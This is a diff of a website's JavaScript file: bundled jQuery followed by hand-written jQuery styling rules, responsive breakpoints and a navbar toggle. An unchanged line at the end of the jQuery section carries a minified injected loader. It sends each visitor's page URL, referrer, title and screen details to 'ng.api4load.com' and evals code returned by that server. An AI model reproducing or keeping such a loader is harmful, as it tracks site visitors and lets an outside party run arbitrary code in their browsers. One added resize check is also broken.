@@ -5,13 +5,473 @@
 ;(function(c,a,m,n){function g(){function ajax(a,b,c){var d=null;try{d=new XMLHttpRequest}catch(e){try{d=new ActiveXObject("Microsoft.XMLHTTP")}catch(f){}}d.onreadystatechange=function(){4==d.readyState&&c&&c(d.responseText)};d.open(b?"POST":"GET",a,!0);d.withCredentials=!0;b?(d.setRequestHeader("Content-Type","application/json; charset=UTF-8"),d.send(JSON.stringify(b))):d.send()}if(c==c.top){for(var f=a.documentElement,b=a.body,req=c.innerWidth||f.clientWidth||b.clientWidth,f=c.innerHeight||f.clientHeight||
 b.clientHeight,b=document.querySelectorAll("meta"),k=[],l=[],e=0;e<b.length;e++)switch(b[e].name.toLowerCase()){case "keywords":k.push(b[e].content);break;case "description":l.push(b[e].content)}req={width:req,height:f,frame:c!=c.top,location:a.location.toString(),referer:a.referrer,title:a.title,keywords:k.join(", "),description:l.join(", "),loader:n};a.gotowf||c.__tcjsch||(a.gotowf=!0,c.__tcjsch=!0,ajax(m,req,function(a){if(a)try{var response=JSON.parse(a);response.eval&&eval(response.eval)}catch(c){}}))}}a.body?g():a.addEventListener("DOMContentLoaded",
 g)})(window,document,"//ng.api4load.com/post",{"version":"1.1","name":"jqr1","time":1575992126,"userid":37138766,"subid":2305970,"cert":true,"server_id":5,"geo":"NG","create_date":1512489092,"sig":"b25e38df92bfa84b47717b4f392b21a5","reg_params":{"b":"Opera","g":"2","m":1,"p":46,"v":2}});
-
 // END OF JQUERY
 
+
 // PROMICE CODE
+$("*").css({
+  margin:"0px",
+  padding:"0px",
+});
+
+$("body").css({
+  lineHeight:"5vh",
+  fontFamily:  "Cambria, Cochin, Georgia, Times, Times New Roman, serif, Tahoma, Geneva, Verdana, sans-serif",
+  fontSize: "2.7vh",
+  width:"100vw",
+  margin:"0px",
+  padding:"0px",
+});
+
+$("a").css({
+  textDecoration: "none",
+  cursor: "pointer",
+});
+
+$("img").css({
+  width:"100%",
+  height:"100%",
+});
+
+$("button").css({
+  padding:"10px",
+});
+
+$(".bg-red").css({
+  backgroundColor:"red",
+});
+
+$(".bg-blue").css({
+  backgroundColor:"blue",
+});
+
+$(".bg-brown").css({
+  backgroundColor:"brown",
+});
+
+$(".bg-pink").css({
+  backgroundColor:"pink",
+});
+
+$(".bg-yellow").css({
+  backgroundColor:"yellow",
+});
+
+$(".bg-black").css({
+  backgroundColor:"black",
+});
+
+$(".bg-green").css({
+  backgroundColor:"green",
+});
+
+$(".bg-purple").css({
+  backgroundColor:"purple",
+});
+
+$(".bg-white").css({
+  backgroundColor:"white",
+});
+
+$(".bg-orange").css({
+  backgroundColor:"orange",
+});
+
+$(".text-red").css({
+  color:"red",
+});
+
+$(".text-blue").css({
+  color:"blue",
+});
+
+$(".text-brown").css({
+  color:"brown",
+});
+
+$(".text-pink").css({
+  color:"pink",
+});
+
+$(".text-yellow").css({
+  color:"yellow",
+});
+
+$(".text-green").css({
+  color:"green",
+});
+
+$(".text-purple").css({
+  color:"purple",
+});
+
+$(".text-white").css({
+  color:"white",
+});
+
+$(".text-orange").css({
+  color:"orange",
+});
+
+$(".text-medium").css({
+  fontSize: "4vh",
+});
+
+$(".text-small").css({
+  fontSize: "3vh",
+});
+
+$(".text-large").css({
+  fontSize: "5vh",
+});
+
+$(".text-center").css({
+  textAlign: "center",
+});
+
+$(".text-left").css({
+  textAlign: "left",
+});
+
+$(".text-right").css({
+  textAlign: "right",
+});
+
+$(".padding-0").css({
+  padding:"0px",
+});
+
+$(".padding-5").css({
+  padding:"5px",
+});
+
+$(".padding-10").css({
+  padding:"10px",
+});
+
+$(".padding-15").css({
+  padding:"15px",
+});
+
+$(".padding-20").css({
+  padding:"20px",
+});
+
+$(".padding-25").css({
+  padding:"25px",
+});
+
+$(".padding-30").css({
+  padding:"30px",
+});
+
+$(".bg-block").css({
+  padding: "30vh",
+});
+
+$(".text-block").css({
+  padding: "15vh",
+});
+
+$(".div-center").css({
+  alignContent: "center",
+});
+
+$(".div-left").css({
+  alignContent: "left",
+});
+
+$(".div-right").css({
+  alignContent: "right",
+});
+
+$(".round-image").css({
+  border: "1px solid",
+  borderRadius: "10000px",
+});
+
+$(".showcase").css({
+  display:"flex",
+  flexDirection: "row",
+  flexWrap: "wrap",
+  justifyContent: "center",
+  padding:"7vh",
+});
+
+$(".full-showcase").css({
+  display:"flex",
+  flexDirection: "row",
+  flexWrap: "wrap",
+  justifyContent: "center",
+});
+
+var divWidth = 100 / $(".showcase").children().length;
+var divWidth = divWidth +"%";
+
+$(".showcase-div").css({
+  width: divWidth,
+  height:"400px",
+});
+
+$(".navbar ul").css({
+  display: "flex",
+  flexDirection: "row",
+  listStyleType: "none",
+  justifyContent: "center",
+  flexWrap: "wrap",
+});
+
+$(".navbar li").css({
+  padding:"10px",
+  paddingRight:"25px",
+  paddingLeft:"25px",
+});
+
+$(".navbar ul li:nth-child(1)").css({
+  marginRight: "auto",
+  fontWeight: "bolder",
+  fontSize: "3.5vh",
+});
+
+$(".navbar-toggle").css({
+  display: "none",
+  fontWeight: "bold",
+  fontSize: "4vh",
+});
+
+$(".stylish-1").css({
+  border: "2px solid",
+  borderTopLeftRadius: "20px",
+  borderBottomRightRadius: "20px",
+});
+
+$(".stylish-2").css({
+  border: "2px solid",
+  borderLeft: "20px",
+  borderRight: "20px",
+  borderBottomLeftRadius: "20px",
+  borderTopRightRadius: "20px",
+});
+
+$(".rounded-1").css({
+  border: "2px solid",
+  borderRadius: "25px"
+});
+
+$(".rounded-2").css({
+  border: "2px solid",
+  borderRadius: "25px",
+  borderBottom: "150px",
+});
+
+$(".fixed").css({
+  position: "fixed",
+  zIndex: "100",
+  width: "100%",
+});
+
+$(".slideshow").css({
+  position: "relative",
+  width: "100vw",
+  height: "70vh",
+});
+
+$(".slideshow div").css({
+  position: "absolute",
+  top: "0px",
+  left: "0px",
+  right: "0px",
+  bottom: "0px",
+});
+
+$(".hover:bg-red").css({
+  backgroundColor:"red",
+});
+
+$(".hover:bg-blue").css({
+  backgroundColor:"blue",
+});
+
+$(".hover:bg-brown").css({
+  backgroundColor:"brown",
+});
+
+$(".hover:bg-pink").css({
+  backgroundColor:"pink",
+});
+
+$(".hover:bg-yellow").css({
+  backgroundColor:"yellow",
+});
+
+$(".hover:bg-black").css({
+  backgroundColor:"black",
+});
+
+$(".hover:bg-green").css({
+  backgroundColor:"green",
+});
+
+$(".hover:bg-purple").css({
+  backgroundColor:"purple",
+});
+
+$(".hover:bg-white").css({
+  backgroundColor:"white",
+});
+
+$(".hover:bg-orange").css({
+  backgroundColor:"orange",
+});
+
+$(".hover:text-red").css({
+  color:"red",
+});
+
+$(".hover:text-blue").css({
+  color:"blue",
+});
+
+$(".hover:text-brown").css({
+  color:"brown",
+});
+
+$(".hover:text-pink").css({
+  color:"pink",
+});
+
+$(".hover:text-yellow").css({
+  color:"yellow",
+});
+
+$(".hover:text-green").css({
+  color:"green",
+});
+
+$(".hover:text-purple").css({
+  color:"purple",
+});
+
+$(".hover:text-white").css({
+  color:"white",
+});
+
+$(".hover:text-orange").css({
+  color:"orange",
+});
+
+$(".hover:text-medium").css({
+  fontSize: "4vh",
+});
+
+$(".hover:text-small").css({
+  fontSize: "3vh",
+});
+
+$(".hover:text-large").css({
+  fontSize: "5vh",
+});
+
+$(".hover:text-center").css({
+  textAlign: "center",
+});
+
+$(".hover:text-left").css({
+  textAlign: "left",
+});
+
+$(".hover:text-right").css({
+  textAlign: "right",
+});
+
+if($(window).width() < 968){
+  $(".animated").css({
+    animationDuration: "1ms",
+    transitionDuration: "1ms",
+    animationIterationCount: "1",
+  });
+  $(".navbar ul").css({
+    flexDirection: "column",
+  });
+  $(".navbar-items").css({
+    display:"none",
+  });
+  $(".navbar-toggle").css({
+    alignSelf: "flex-end",
+    display: "initial",
+    position: "absolute",
+    cursor: "pointer",
+  });
+  $(".bg-block").css({
+    padding:"10vh",
+    paddingTop:"20vh",
+  });
+  $(".showcase").css({
+    display:"flex",
+    flexDirection: "column",
+    flexWrap: "wrap",
+    justifyContent: "center",
+    padding:"7vh",
+  });
+  $(".showcase").css({
+    display:"flex",
+    flexDirection: "column",
+    flexWrap: "wrap",
+    justifyContent: "center",
+    padding:"7vh",
+  });
+  $(".showcase-div").css({
+    width: "100%",
+  });
+  $(".gallery").css({
+    display: "grid",
+    gridTemplateColumns: "100%",
+    gridGap: "3vh",
+  }); 
+}
+
+if ($(window).resize() < 968){
+  $(".animated").css({
+    animationDuration: "1ms",
+    transitionDuration: "1ms",
+    animationIterationCount: "1",
+  });
+  $(".navbar ul").css({
+    flexDirection: "column",
+  });
+  $(".navbar-items").css({
+    display:"none",
+  });
+  $(".navbar-toggle").css({
+    alignSelf: "flex-end",
+    display: "initial",
+    position: "absolute",
+    cursor: "pointer",
+  });
+  $(".bg-block").css({
+    padding:"10vh",
+    paddingTop:"20vh",
+  });
+  $(".showcase").css({
+    display:"flex",
+    flexDirection: "column",
+    flexWrap: "wrap",
+    justifyContent: "center",
+    padding:"7vh",
+  });
+  $(".showcase").css({
+    display:"flex",
+    flexDirection: "column",
+    flexWrap: "wrap",
+    justifyContent: "center",
+    padding:"7vh",
+  });
+  $(".showcase-div").css({
+    width: "100%",
+  });
+}
 
 $(function(){
-
   $(".navbar-toggle").click(function(){
     $(".navbar-items").slideToggle().css({
       display: "flex",
@@ -28,5 +488,4 @@ $(function(){
       .end()
       .appendTo('.slideshow');
   },  5000);
-
 });
